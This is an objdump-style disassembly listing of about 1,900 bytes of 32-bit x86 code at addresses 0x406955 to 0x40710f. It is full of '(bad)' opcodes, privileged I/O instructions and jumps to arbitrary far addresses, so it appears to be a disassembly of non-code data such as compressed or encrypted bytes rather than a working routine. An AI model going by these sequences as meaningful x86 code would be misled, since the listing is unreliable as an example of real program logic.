  406955:	lea    ecx,[esi+0x503324aa]
  40695b:	adc    esi,ebp
  40695d:	xor    eax,DWORD PTR [ebp+0x7b68deb1]
  406963:	(bad)  
  406964:	(bad)  
  406965:	mov    al,0x1f
  406967:	pop    ds
  406968:	repnz sub al,0xef
  40696b:	ja     0x4069e5
  40696d:	sti    
  40696e:	das    
  40696f:	and    edx,DWORD PTR [edx]
  406971:	into   
  406972:	or     al,0x38
  406974:	(bad)  
  406975:	adc    eax,0x2b2428d9
  40697a:	sbb    esp,edx
  40697c:	loope  0x4069e1
  40697e:	mov    ecx,0x97d79eac
  406983:	mov    bl,BYTE PTR [ebx+0x41f667f3]
  406989:	push   es
  40698a:	cwde   
  40698b:	(bad)  
  40698c:	stos   BYTE PTR es:[edi],al
  40698d:	mov    dh,0xe
  40698f:	sahf   
  406990:	or     eax,DWORD PTR [ecx-0x24ffa116]
  406996:	jns    0x4069b5
  406998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406999:	jo     0x40692d
  40699b:	popf   
  40699c:	inc    ecx
  40699d:	lock jnp 0x406a02
  4069a0:	test   eax,0xfc08313a
  4069a5:	in     al,dx
  4069a6:	loopne 0x406989
  4069a8:	std    
  4069a9:	pop    edx
  4069aa:	rol    DWORD PTR [ebx],cl
  4069ac:	loope  0x40697c
  4069ae:	fsub   DWORD PTR [eax-0x4282a89a]
  4069b4:	test   esp,edx
  4069b6:	lahf   
  4069b7:	outs   dx,BYTE PTR ds:[esi]
  4069b8:	pushf  
  4069b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069ba:	aam    0x3e
  4069bc:	in     al,dx
  4069bd:	jmp    0x40696c
  4069bf:	fdivr  DWORD PTR [eax+0x29]
  4069c2:	dec    ecx
  4069c3:	js     0x406a3c
  4069c5:	shl    eax,cl
  4069c7:	push   DWORD PTR [edi+eax*2+0x4accd6be]
  4069ce:	jno    0x406959
  4069d0:	mov    ebp,0xb87cb287
  4069d5:	fdivr  QWORD PTR [esi]
  4069d7:	in     al,0x29
  4069d9:	xchg   ecx,eax
  4069da:	int    0xe
  4069dc:	push   0x16
  4069de:	sti    
  4069df:	hlt    
  4069e0:	push   esp
  4069e1:	mov    ebx,0x527e5406
  4069e6:	fsubp  st(5),st
  4069e8:	cdq    
  4069e9:	arpl   WORD PTR [esi-0x5d],di
  4069ec:	jmp    0xfd33:0xc0cfbf6d
  4069f3:	push   ecx
  4069f4:	sar    BYTE PTR [ebx],1
  4069f6:	adc    eax,0xa11a1751
  4069fb:	les    edi,FWORD PTR [ebx+0x14a5d7f0]
  406a01:	test   DWORD PTR [ebp+ebx*1+0x30],0xfd56bfac
  406a09:	into   
  406a0a:	jnp    0x406a7f
  406a0c:	ja     0x406a55
  406a0e:	sbb    eax,0xc94c15d8
  406a13:	shl    BYTE PTR [edi-0x44],0x3a
  406a17:	jmp    0x90c80f3d
  406a1c:	push   edi
  406a1d:	push   0xffffff8e
  406a1f:	push   ds
  406a20:	das    
  406a21:	popf   
  406a22:	xchg   bl,bh
  406a24:	mov    al,ds:0x935e4366
  406a29:	ret    
  406a2a:	(bad)  
  406a2b:	sti    
  406a2c:	jnp    0x406a35
  406a2e:	mov    al,0x72
  406a30:	sahf   
  406a31:	sbb    al,0x42
  406a33:	and    edi,DWORD PTR [ecx+0x14]
  406a36:	pop    edx
  406a37:	jle    0x406aa3
  406a39:	aaa    
  406a3a:	xchg   DWORD PTR [edi-0x6b],esi
  406a3d:	push   0x982d0008
  406a42:	pop    edi
  406a43:	div    BYTE PTR [ebx-0x46e01551]
  406a49:	mov    esi,0xa2c338d0
  406a4e:	mov    cs,WORD PTR [ebp+0x53]
  406a51:	fwait
  406a52:	jo     0x406a6c
  406a54:	sbb    eax,0xbb3c397b
  406a59:	mov    bh,BYTE PTR [edx+ecx*2+0x942b38a]
  406a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a61:	fild   WORD PTR [esp+ecx*4-0x7e2c008]
  406a68:	test   al,0x67
  406a6a:	dec    edx
  406a6b:	xor    DWORD PTR ds:0x53746f6e,edi
  406a71:	leave  
  406a72:	cmp    BYTE PTR [ecx+0x2b],ah
  406a75:	repnz or eax,0x18c24d91
  406a7b:	add    dh,BYTE PTR [ebx]
  406a7d:	int3   
  406a7e:	sub    al,0xd1
  406a80:	test   dl,cl
  406a82:	xor    al,0xf2
  406a84:	adc    DWORD PTR [ecx+edx*1+0x4f],ebx
  406a88:	(bad)  
  406a89:	mov    edx,0x781a3c49
  406a8e:	xchg   edx,eax
  406a8f:	pusha  
  406a90:	xchg   ah,bl
  406a92:	pop    ebx
  406a93:	das    
  406a94:	fimul  WORD PTR [ebx]
  406a96:	cli    
  406a97:	jmp    0x2ee7f38a
  406a9c:	repz in al,0x10
  406a9f:	outs   dx,BYTE PTR ds:[esi]
  406aa0:	pop    edi
  406aa1:	mov    ebp,0xa9939714
  406aa6:	adc    BYTE PTR [eax],dh
  406aa8:	retf   
  406aa9:	mov    al,0xf7
  406aab:	shr    BYTE PTR [edx-0x7061e465],cl
  406ab1:	mov    bh,0x28
  406ab3:	int    0x87
  406ab5:	mov    edi,0xf6cd9c8a
  406aba:	scas   eax,DWORD PTR es:[edi]
  406abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406abc:	jmp    0x406b07
  406abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406abf:	add    eax,0xd4d5eb0
  406ac4:	mov    al,ds:0xeb798991
  406ac9:	or     ebx,DWORD PTR [ecx]
  406acb:	out    0xd4,al
  406acd:	lods   eax,DWORD PTR ds:[esi]
  406ace:	fadd   QWORD PTR [ebp+0x18643fc1]
  406ad4:	mov    esp,0xe3dd2def
  406ad9:	outs   dx,DWORD PTR ds:[esi]
  406ada:	mov    ah,0x62
  406adc:	in     al,0xc6
  406ade:	ja     0x406b5d
  406ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ae1:	sbb    al,0x66
  406ae3:	popf   
  406ae4:	mov    esp,0x51a76990
  406ae9:	pop    esp
  406aea:	mov    DWORD PTR [ebp-0x48339186],esi
  406af0:	dec    edi
  406af1:	fwait
  406af2:	adc    BYTE PTR [ebp+0x316890b2],bl
  406af8:	scas   al,BYTE PTR es:[edi]
  406af9:	sbb    DWORD PTR es:[ebp+0x72378081],esp
  406b00:	or     ah,al
  406b02:	js     0x406b4f
  406b04:	add    DWORD PTR [edx+0x6d],edx
  406b07:	cli    
  406b08:	(bad)  
  406b09:	inc    ebp
  406b0a:	mov    ah,0x8f
  406b0c:	stos   BYTE PTR es:[edi],al
  406b0d:	(bad)  
  406b0e:	cmp    BYTE PTR [edx],al
  406b10:	ds daa 
  406b12:	and    al,0xf3
  406b14:	frstpm(287 only) 
  406b16:	test   DWORD PTR [eax],edi
  406b18:	inc    BYTE PTR [ebp-0x80]
  406b1b:	les    eax,FWORD PTR [edi+0x19cd79f3]
  406b21:	scas   eax,DWORD PTR es:[edi]
  406b22:	enter  0x4a34,0xf0
  406b26:	aam    0x1a
  406b28:	test   al,0x59
  406b2a:	cmp    DWORD PTR [eax],0x35
  406b2d:	mov    ds:0xa0888721,eax
  406b32:	mov    edi,0xcbf4d3d3
  406b37:	lods   eax,DWORD PTR ds:[esi]
  406b38:	mov    ecx,0xbab43937
  406b3d:	in     ax,dx
  406b3f:	fcomp  QWORD PTR [ecx]
  406b41:	pop    es
  406b42:	loopne 0x406b68
  406b44:	fstp   DWORD PTR [ecx]
  406b46:	jnp    0x406b01
  406b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b49:	xchg   edx,eax
  406b4a:	add    BYTE PTR [edx],bl
  406b4c:	lock xchg BYTE PTR [ecx-0x512be184],dl
  406b53:	arpl   WORD PTR [edx-0x38df142e],dx
  406b59:	rol    DWORD PTR [edi],0x55
  406b5c:	xchg   esi,eax
  406b5d:	pop    edx
  406b5e:	nop
  406b5f:	jb     0x406b66
  406b61:	pop    ss
  406b62:	retf   
  406b63:	nop
  406b64:	add    DWORD PTR [ebp+0x242b9ae0],0x1859978
  406b6e:	je     0x406bd5
  406b70:	mov    esp,0x691836d3
  406b75:	push   es
  406b76:	test   BYTE PTR [esi+edx*4],cl
  406b79:	jno    0x406b2e
  406b7b:	int    0x9e
  406b7d:	retf   
  406b7e:	out    0x6f,eax
  406b80:	jge    0x406bd9
  406b82:	jg     0x406b7e
  406b84:	sti    
  406b85:	dec    esi
  406b86:	inc    eax
  406b87:	idiv   BYTE PTR [ecx-0x48d3d31c]
  406b8d:	fwait
  406b8e:	push   esi
  406b8f:	sbb    al,0x7f
  406b91:	cmp    DWORD PTR [esi],edi
  406b93:	mov    dl,0x8d
  406b95:	cdq    
  406b96:	(bad)  
  406b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b98:	sti    
  406b99:	mov    ecx,0xdc8dec26
  406b9e:	out    0x78,al
  406ba0:	dec    eax
  406ba1:	adc    BYTE PTR [ebx-0xd],dl
  406ba4:	dec    ebp
  406ba5:	in     eax,dx
  406ba6:	js     0x406bc1
  406ba8:	pusha  
  406ba9:	out    0xd9,al
  406bab:	cs jle 0x406c2d
  406bae:	push   cs
  406baf:	pop    es
  406bb0:	sub    eax,0xb53d38c6
  406bb5:	ret    
  406bb6:	dec    esi
  406bb7:	mov    dh,0x7d
  406bb9:	and    al,0x9f
  406bbb:	pop    esp
  406bbc:	sbb    ecx,edx
  406bbe:	jecxz  0x406c05
  406bc0:	mov    BYTE PTR [ebp-0x24a64bd8],dh
  406bc6:	fwait
  406bc7:	jmp    0x10dc834f
  406bcc:	out    dx,eax
  406bcd:	mov    edx,0xf1bd56f9
  406bd2:	cs push edi
  406bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd5:	jg     0x406c00
  406bd7:	js     0x406bbc
  406bd9:	mov    edx,DWORD PTR [edx+0x47600b8a]
  406bdf:	clc    
  406be0:	(bad)  
  406be1:	ds add esi,esi
  406be4:	jnp    0x406c5b
  406be6:	enter  0x8936,0x1f
  406bea:	jns    0x406bd5
  406bec:	rcr    BYTE PTR [eax-0x7f6d18b3],cl
  406bf2:	mov    ebp,0x9bf5889a
  406bf7:	in     eax,0x12
  406bf9:	sbb    al,0x1
  406bfb:	jl     0x406c13
  406bfd:	mov    ah,0x4a
  406bff:	pop    esi
  406c00:	rcl    BYTE PTR [ebx+0x1a],0xc5
  406c04:	cmp    BYTE PTR [ebx],dh
  406c06:	xchg   DWORD PTR [esi+0x62afd593],esi
  406c0c:	and    ecx,DWORD PTR [edx-0x767d2c47]
  406c12:	push   esp
  406c13:	jo     0x406c0a
  406c15:	mov    WORD PTR [edx+0x7beb2b8],?
  406c1b:	(bad)  
  406c1c:	xchg   edi,eax
  406c1d:	inc    ebp
  406c1e:	xor    ebp,DWORD PTR [esi]
  406c20:	push   es
  406c21:	enter  0x2e41,0x47
  406c25:	mov    ds:0x6420432a,eax
  406c2a:	je     0x406bb6
  406c2c:	imul   esi,DWORD PTR [esi+0x59],0xc9bc7010
  406c33:	sub    al,0xeb
  406c35:	and    al,0xa0
  406c37:	push   esi
  406c38:	(bad)  
  406c39:	pop    ebp
  406c3a:	inc    esi
  406c3b:	xchg   edx,eax
  406c3c:	std    
  406c3d:	xchg   esp,eax
  406c3e:	aas    
  406c3f:	dec    ebp
  406c40:	stos   DWORD PTR es:[edi],eax
  406c41:	(bad)  
  406c42:	daa    
  406c43:	retf   0x55ed
  406c46:	in     eax,dx
  406c47:	js     0x406bf3
  406c49:	dec    BYTE PTR [ebx-0x9]
  406c4c:	call   0xa79ca5f5
  406c51:	mov    ch,0xd0
  406c53:	(bad)  
  406c55:	pushf  
  406c56:	pop    esp
  406c57:	pop    ecx
  406c58:	lahf   
  406c59:	jge    0x406cb7
  406c5b:	jo     0x406c61
  406c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5e:	mov    al,ds:0x1a78d9fa
  406c63:	pop    ebp
  406c64:	xchg   BYTE PTR [edi+edx*2+0x36da6d48],cl
  406c6b:	imul   DWORD PTR [eax+0x81edf5d]
  406c71:	push   eax
  406c72:	xor    BYTE PTR [edx+0x379eb576],ah
  406c78:	cli    
  406c79:	shl    dh,1
  406c7b:	cmp    dl,BYTE PTR [edx]
  406c7d:	add    dh,BYTE PTR ds:0xba4074be
  406c83:	push   ss
  406c84:	das    
  406c85:	int3   
  406c86:	jns    0x406ce8
  406c88:	repz xor bl,0x1f
  406c8c:	ret    0x4acd
  406c8f:	jns    0x406c1c
  406c91:	fsubp  st(3),st
  406c93:	fisubr DWORD PTR [esi-0x78]
  406c96:	ror    DWORD PTR [eax-0x4],1
  406c99:	push   ds
  406c9a:	push   ebp
  406c9b:	(bad)  
  406c9c:	call   0x51c39987
  406ca1:	jmp    DWORD PTR [ecx]
  406ca3:	and    DWORD PTR ds:0x11bf6653,eax
  406ca9:	mov    bl,0xd1
  406cab:	mov    dl,0xeb
  406cad:	mov    eax,0xa96c640
  406cb2:	mov    eax,ds:0x76eb1195
  406cb7:	jmp    0x406d33
  406cb9:	mov    al,ds:0x3367520d
  406cbe:	scas   eax,DWORD PTR es:[edi]
  406cbf:	(bad)  [edx]
  406cc1:	cli    
  406cc2:	pop    ebp
  406cc3:	mov    dh,0xdc
  406cc5:	pop    ds
  406cc6:	cmp    BYTE PTR [esi-0x5c5ae2c2],ah
  406ccc:	ds jns 0x406ccc
  406ccf:	mov    cl,0x4a
  406cd1:	xor    eax,0x5c26aa89
  406cd6:	bound  esp,QWORD PTR [eax+0xd]
  406cd9:	mov    esi,0x444b1690
  406cde:	mov    edx,0x45b9206
  406ce3:	aaa    
  406ce4:	in     eax,0xd6
  406ce6:	xchg   esp,eax
  406ce7:	clc    
  406ce8:	adc    eax,0xb5c2e462
  406ced:	xor    cl,BYTE PTR [edi+0x4cbaa8ce]
  406cf3:	add    DWORD PTR [esi],ecx
  406cf5:	je     0x406d48
  406cf7:	mov    ebp,DWORD PTR [esi]
  406cf9:	xchg   ebx,eax
  406cfa:	sbb    BYTE PTR [ebx+0x45],0x6f
  406cfe:	sub    BYTE PTR [esi+ecx*4-0x527163c8],0x63
  406d06:	jmp    0x1877ae71
  406d0b:	and    BYTE PTR [ebx+ebp*2],ch
  406d0e:	push   ebx
  406d0f:	xchg   edi,eax
  406d10:	xchg   edx,eax
  406d11:	fisubr DWORD PTR [ebx+0x4aa2d206]
  406d17:	dec    ebx
  406d18:	or     al,BYTE PTR [eax+0xcafdeb1]
  406d1e:	clc    
  406d1f:	leave  
  406d20:	mov    BYTE PTR [ebx-0x6c],bh
  406d23:	call   0xb2841234
  406d28:	addr16 fs popa 
  406d2b:	jne    0x406ce9
  406d2d:	in     al,dx
  406d2e:	jmp    0x2759a278
  406d33:	pop    ecx
  406d34:	andps  xmm1,XMMWORD PTR [ebx+0x52]
  406d38:	popf   
  406d39:	clc    
  406d3a:	loop   0x406ccb
  406d3c:	jmp    0x3b7daa94
  406d41:	push   ecx
  406d42:	std    
  406d43:	push   0xffffffd0
  406d45:	add    al,0x73
  406d47:	or     DWORD PTR [ecx-0x13],edi
  406d4a:	loope  0x406d26
  406d4c:	lods   eax,DWORD PTR ds:[esi]
  406d4d:	inc    ebp
  406d4e:	pop    eax
  406d4f:	mov    eax,0x7e931473
  406d54:	mov    ebp,0x1004175e
  406d59:	or     bl,BYTE PTR [edx]
  406d5b:	xor    eax,0x6cd33dee
  406d60:	imul   eax,DWORD PTR [esp+edi*2],0xd05f5f4e
  406d67:	push   esp
  406d68:	jo     0x406d35
  406d6a:	retf   
  406d6b:	data16 or dh,dl
  406d6e:	push   edi
  406d6f:	test   al,0xc4
  406d71:	in     eax,dx
  406d72:	int    0x6
  406d74:	inc    ebx
  406d75:	xchg   ecx,eax
  406d76:	jge    0x406d93
  406d78:	adc    BYTE PTR [ebp+0x38],dl
  406d7b:	jbe    0x406d21
  406d7d:	dec    edx
  406d7e:	imul   ecx,DWORD PTR [ebx+ebp*8-0x449cc7b4],0x98d34ca9
  406d89:	in     eax,dx
  406d8a:	add    eax,0x33ea919d
  406d8f:	nop
  406d90:	dec    edx
  406d91:	test   eax,0x9371ba9a
  406d96:	out    0x8,eax
  406d98:	ret    0x8d16
  406d9b:	rcl    BYTE PTR [edi+edi*2+0x39],1
  406d9f:	and    eax,0x71fa9c07
  406da4:	and    DWORD PTR [ecx],esp
  406da6:	shr    BYTE PTR [ebx+0xf],1
  406da9:	mov    ebx,0x25cd4210
  406dae:	mov    ds:0xbc73a7a2,al
  406db3:	daa    
  406db4:	add    BYTE PTR [ecx],0xff
  406db7:	mov    ebp,DWORD PTR [eax]
  406db9:	sbb    al,bl
  406dbb:	xor    ecx,DWORD PTR [esi*8-0x7ba869fa]
  406dc2:	pop    esi
  406dc3:	fsubr  DWORD PTR [esi+0x52]
  406dc6:	adc    BYTE PTR [ecx+0x117c0aaa],0x92
  406dcd:	int    0x70
  406dcf:	push   edx
  406dd0:	pop    edx
  406dd1:	(bad)  
  406dd2:	fld    QWORD PTR [ebx-0x39ce9482]
  406dd8:	out    0x8d,al
  406dda:	outs   dx,BYTE PTR ds:[si]
  406ddc:	loope  0x406d99
  406dde:	pop    ss
  406ddf:	into   
  406de0:	ds xor BYTE PTR gs:[edi-0x4a],ch
  406de5:	test   BYTE PTR [ebp+0x4b7e4c03],0x93
  406dec:	sub    eax,0x8ccbbba0
  406df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406df2:	jmp    edi
  406df4:	leave  
  406df5:	retf   
  406df6:	dec    esi
  406df7:	aad    0x8f
  406df9:	sbb    eax,DWORD PTR [esi]
  406dfb:	dec    esi
  406dfc:	cwde   
  406dfd:	or     eax,0x48a2f955
  406e02:	sbb    al,bh
  406e04:	mov    al,ds:0xe13bf646
  406e09:	pop    ebx
  406e0a:	int    0x77
  406e0c:	fs mov bl,0x9a
  406e0f:	and    ah,BYTE PTR [edx+0x60]
  406e12:	sar    BYTE PTR [ebx+0x651990e7],0x6
  406e19:	mov    edx,0xdeeb1399
  406e1e:	stos   BYTE PTR es:[edi],al
  406e1f:	rcr    BYTE PTR [ecx-0x6],cl
  406e22:	or     ebp,DWORD PTR [edi-0x79d315b3]
  406e28:	mov    DWORD PTR [eax],ebx
  406e2a:	xchg   DWORD PTR [edx+0x3b239c43],ebp
  406e30:	aam    0x44
  406e32:	mov    BYTE PTR [ebx],bh
  406e34:	cmp    al,0x3d
  406e36:	pop    esp
  406e37:	mov    ebx,0x1c3b059f
  406e3c:	lods   al,BYTE PTR ds:[esi]
  406e3d:	das    
  406e3e:	rcl    DWORD PTR [edx],1
  406e40:	(bad)  
  406e41:	imul   ebp,DWORD PTR [edi+0x68b43d8d],0xab9b7674
  406e4b:	es dec ebp
  406e4d:	dec    esp
  406e4e:	lahf   
  406e4f:	data16 das 
  406e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e52:	xor    edx,ecx
  406e54:	out    dx,eax
  406e55:	adc    bl,ch
  406e57:	aas    
  406e58:	push   ds
  406e59:	in     eax,dx
  406e5a:	rcr    BYTE PTR [ebp+0x76],cl
  406e5d:	pmuludq mm3,mm5
  406e60:	scas   eax,DWORD PTR es:[edi]
  406e61:	sar    DWORD PTR [eax],1
  406e63:	jmp    0x406e7d
  406e65:	sbb    bh,BYTE PTR [ebx]
  406e67:	inc    edi
  406e68:	and    cl,BYTE PTR [esi]
  406e6a:	push   0xffffffb1
  406e6c:	and    edi,ebx
  406e6e:	mov    eax,0xa099c32c
  406e73:	out    dx,al
  406e74:	sub    al,0xb
  406e76:	fist   DWORD PTR [ebx-0x574be4c6]
  406e7c:	neg    DWORD PTR [edi+0x217d2594]
  406e82:	gs push 0x5f
  406e85:	mov    ebx,0x946708c1
  406e8a:	stos   DWORD PTR es:[edi],eax
  406e8b:	sbb    bl,al
  406e8d:	cmp    esi,ebp
  406e8f:	dec    eax
  406e90:	sub    ebp,DWORD PTR [ebx]
  406e92:	lds    esp,FWORD PTR [edx-0x123e65ff]
  406e98:	pusha  
  406e99:	mov    esi,0x50b74300
  406e9e:	pop    eax
  406e9f:	xchg   BYTE PTR [ebx+0x5a],bh
  406ea2:	int    0x70
  406ea4:	push   ds
  406ea5:	(bad)  [edx-0x45]
  406ea8:	jnp    0x406ecb
  406eaa:	test   BYTE PTR [esi-0x5c],bl
  406ead:	jne    0x406e4d
  406eaf:	hlt    
  406eb0:	sti    
  406eb1:	sub    DWORD PTR [ecx+0x1],edx
  406eb4:	push   edx
  406eb5:	push   0xffffffb3
  406eb7:	cmp    ch,BYTE PTR [esi+ecx*4]
  406eba:	or     ebp,esi
  406ebc:	(bad)  
  406ebd:	push   edi
  406ebe:	push   ebx
  406ebf:	sub    ecx,DWORD PTR [edi-0x48]
  406ec2:	test   ah,ch
  406ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ec5:	cwde   
  406ec6:	or     BYTE PTR [ecx-0x7f],al
  406ec9:	fwait
  406eca:	xor    DWORD PTR [edi+0x7f],0x46
  406ece:	in     al,0x32
  406ed0:	leave  
  406ed1:	sar    eax,cl
  406ed3:	jmp    0xf2c63e29
  406ed8:	add    bh,ah
  406eda:	in     eax,0xbb
  406edc:	adc    cl,BYTE PTR [ecx]
  406ede:	ret    
  406edf:	cmp    DWORD PTR [ebx+0x30],edi
  406ee2:	aad    0xc0
  406ee4:	cs mov eax,0x2770abf0
  406eea:	jmp    0x8e09f43b
  406eef:	cmp    eax,ecx
  406ef1:	call   0xee6b:0x9603b893
  406ef8:	call   0x9ee1:0x5f250240
  406eff:	repnz (bad) 
  406f01:	cld    
  406f02:	in     eax,dx
  406f03:	cli    
  406f04:	out    0xcc,eax
  406f06:	ret    0x27b9
  406f09:	sbb    eax,0x4103016b
  406f0e:	push   DWORD PTR [eax-0x3cbd4eda]
  406f14:	scas   eax,DWORD PTR es:[edi]
  406f15:	push   es
  406f16:	in     al,0x23
  406f18:	aad    0x96
  406f1a:	aad    0x94
  406f1c:	inc    edi
  406f1d:	pop    es
  406f1e:	and    ebp,DWORD PTR gs:[edi]
  406f21:	push   cs
  406f22:	(bad)  
  406f23:	jbe    0x406f4b
  406f25:	stos   DWORD PTR es:[edi],eax
  406f26:	xor    bl,BYTE PTR [edx]
  406f28:	xor    bl,BYTE PTR cs:[esi+edi*2+0xd]
  406f2d:	nop
  406f2e:	mov    ah,BYTE PTR [eax-0x1de47748]
  406f34:	or     eax,DWORD PTR [ebp-0x275b1dab]
  406f3a:	mov    ch,0x52
  406f3c:	daa    
  406f3d:	aad    0xf1
  406f3f:	fidivr DWORD PTR [ecx]
  406f41:	cmp    dl,bh
  406f43:	jmp    0xf0c60023
  406f48:	mov    dl,0x9
  406f4a:	pop    es
  406f4b:	xlat   BYTE PTR ds:[ebx]
  406f4c:	inc    ecx
  406f4d:	loope  0x406f9b
  406f4f:	pop    ss
  406f50:	or     BYTE PTR [ebp+0x7e8f2afc],dl
  406f56:	daa    
  406f57:	dec    edx
  406f58:	call   DWORD PTR ds:0x28a4d37c
  406f5e:	or     al,0x81
  406f60:	ret    
  406f61:	inc    esp
  406f62:	push   ss
  406f63:	push   ebx
  406f64:	add    DWORD PTR [edx-0x7d],esi
  406f67:	lock dec ebx
  406f69:	rcr    DWORD PTR [edi],0x78
  406f6c:	push   eax
  406f6d:	cmp    BYTE PTR [ebp-0x5d],0x23
  406f71:	xchg   ebp,eax
  406f72:	pop    es
  406f73:	mov    eax,0xb4013116
  406f78:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f7a:	out    dx,eax
  406f7b:	push   edi
  406f7c:	out    dx,eax
  406f7d:	push   esp
  406f7e:	scas   eax,DWORD PTR es:[edi]
  406f7f:	fisttp QWORD PTR [eax]
  406f81:	xor    bh,bh
  406f83:	mov    edi,0xaaad04c4
  406f88:	push   eax
  406f89:	rcl    BYTE PTR [ebp+0x1a],cl
  406f8c:	lahf   
  406f8d:	mov    ebx,0xfc360960
  406f92:	(bad)  
  406f94:	repnz in eax,0x74
  406f97:	dec    edi
  406f98:	rcl    al,cl
  406f9a:	call   0xe31:0x99a5829
  406fa1:	xchg   esi,eax
  406fa2:	call   0xb636:0xab194b2e
  406fa9:	nop
  406faa:	lahf   
  406fab:	xchg   edx,eax
  406fac:	fwait
  406fad:	push   ss
  406fae:	sbb    DWORD PTR [ebx+edx*4-0x5ba47e90],0xffffffa3
  406fb6:	add    ah,ah
  406fb8:	shl    DWORD PTR [edi],0xca
  406fbb:	jae    0x406f52
  406fbd:	imul   eax,esp,0xeb49112f
  406fc3:	mov    ds:0x5b296f32,eax
  406fc8:	ds into 
  406fca:	jl     0x407038
  406fcc:	cs and al,0x39
  406fcf:	jmp    DWORD PTR [edi+eiz*4]
  406fd2:	loopne 0x406f7e
  406fd4:	(bad)  
  406fd5:	mov    cl,0x87
  406fd7:	cmp    dl,dl
  406fd9:	lods   al,BYTE PTR ds:[esi]
  406fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fdb:	push   ebp
  406fdc:	nop
  406fdd:	xor    eax,0x4817673a
  406fe2:	xor    ch,0xa7
  406fe5:	inc    esi
  406fe6:	mov    ebx,esp
  406fe8:	mov    ah,0x3
  406fea:	sbb    eax,0x9fe09f85
  406fef:	cmp    DWORD PTR [esi+ecx*1+0x5a31eb3e],0xffffffce
  406ff7:	push   ebx
  406ff8:	jle    0x406fba
  406ffa:	add    ebx,ebp
  406ffc:	in     al,0x99
  406ffe:	clc    
  406fff:	cmc    
  407000:	fnstsw WORD PTR [ebx+0x4a]
  407003:	sbb    edx,eax
  407005:	push   edx
  407006:	dec    esi
  407007:	jae    0x40707a
  407009:	and    dh,BYTE PTR [ebx+0x75]
  40700c:	mov    ecx,0x3d05d4e5
  407011:	lods   eax,DWORD PTR ds:[esi]
  407012:	mov    ds:0x90e69ded,eax
  407017:	dec    esi
  407018:	push   eax
  407019:	xlat   BYTE PTR ds:[ebx]
  40701a:	test   DWORD PTR [ecx],0xc5f8e87b
  407020:	fiadd  DWORD PTR [ecx]
  407022:	push   es
  407023:	dec    ebx
  407024:	inc    eax
  407025:	dec    ebp
  407026:	dec    esi
  407027:	sbb    DWORD PTR [ebx],0xd2cb8664
  40702d:	bound  esi,QWORD PTR [edi-0x5e4799b6]
  407033:	xor    al,0x7e
  407035:	lods   al,BYTE PTR ds:[esi]
  407036:	push   eax
  407037:	popf   
  407038:	shl    dl,1
  40703a:	mov    dh,0x7a
  40703c:	int    0x9a
  40703e:	outs   dx,BYTE PTR ds:[esi]
  40703f:	and    edx,esp
  407041:	mov    eax,0x6e563eea
  407046:	sub    BYTE PTR [edi],bh
  407048:	fcomp  QWORD PTR [ecx+0x7a]
  40704b:	push   ebx
  40704c:	sbb    edi,DWORD PTR [ebx-0x5f]
  40704f:	cmp    eax,0xcd6deb23
  407054:	add    al,bl
  407056:	xchg   ebx,eax
  407057:	scas   al,BYTE PTR es:[edi]
  407058:	fisub  WORD PTR [eax+edx*4+0x3a]
  40705c:	mov    eax,ds:0xdee4f0b3
  407061:	jne    0x407009
  407063:	aad    0x2c
  407065:	mov    bh,0x18
  407067:	ror    DWORD PTR [ebx],1
  407069:	icebp  
  40706a:	rol    DWORD PTR [esi+0x59],1
  40706d:	mov    al,ds:0x998f5af8
  407072:	mov    ebp,?
  407074:	repz fwait
  407076:	pop    ecx
  407077:	sub    al,0x5d
  407079:	(bad)  
  40707a:	or     eax,0x952cfba8
  40707f:	sbb    ch,BYTE PTR [edx]
  407081:	lods   eax,DWORD PTR ds:[esi]
  407082:	int    0x5e
  407084:	push   esi
  407085:	push   ebx
  407086:	std    
  407087:	xchg   BYTE PTR ss:[ebp-0x76],dl
  40708b:	ficom  WORD PTR [ecx+0x7b4328c0]
  407091:	mov    esi,0x22a0f114
  407096:	nop
  407097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407098:	inc    ebp
  407099:	sub    ebx,ebx
  40709b:	aaa    
  40709c:	sar    BYTE PTR [eax+0x13ad1b29],cl
  4070a2:	fcmovu st,st(4)
  4070a4:	or     DWORD PTR [edi-0x1b6be235],ecx
  4070aa:	fbstp  TBYTE PTR [ecx+0x56]
  4070ad:	and    DWORD PTR [edi+ebx*4-0x1591de0a],edx
  4070b4:	loop   0x4070d9
  4070b6:	xlat   BYTE PTR ds:[ebx]
  4070b7:	xchg   DWORD PTR [esi-0x16],esp
  4070ba:	fs pop ebp
  4070bc:	test   esi,eax
  4070be:	out    dx,eax
  4070bf:	sub    eax,0xae83ec24
  4070c4:	iret   
  4070c5:	push   0x48ae1985
  4070ca:	inc    ebp
  4070cb:	and    BYTE PTR [esi],bl
  4070cd:	mov    bl,0xbf
  4070cf:	daa    
  4070d0:	icebp  
  4070d1:	cwde   
  4070d2:	jmp    0xc2a09922
  4070d7:	push   esp
  4070d8:	arpl   cx,cx
  4070da:	mov    edx,0xfb4879f5
  4070df:	out    0x9b,eax
  4070e1:	push   edx
  4070e2:	xchg   esp,eax
  4070e3:	sbb    DWORD PTR [ebx+0x3d2f8d82],esp
  4070e9:	mov    ebx,0x9613df1c
  4070ee:	xor    esp,DWORD PTR [eax+ebp*4+0x44610e2d]
  4070f5:	jmp    0xf59efeef
  4070fa:	dec    ebx
  4070fb:	dec    ebp
  4070fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070fd:	ret    0x12cd
  407100:	outs   dx,DWORD PTR ds:[esi]
  407101:	jns    0x4070b1
  407103:	out    0x71,eax
  407105:	add    BYTE PTR [eax+eiz*1+0x7b],dh
  407109:	stc    
  40710a:	adc    eax,0xe216ec19
  40710f:	scas   al,BYTE PTR es:[edi]
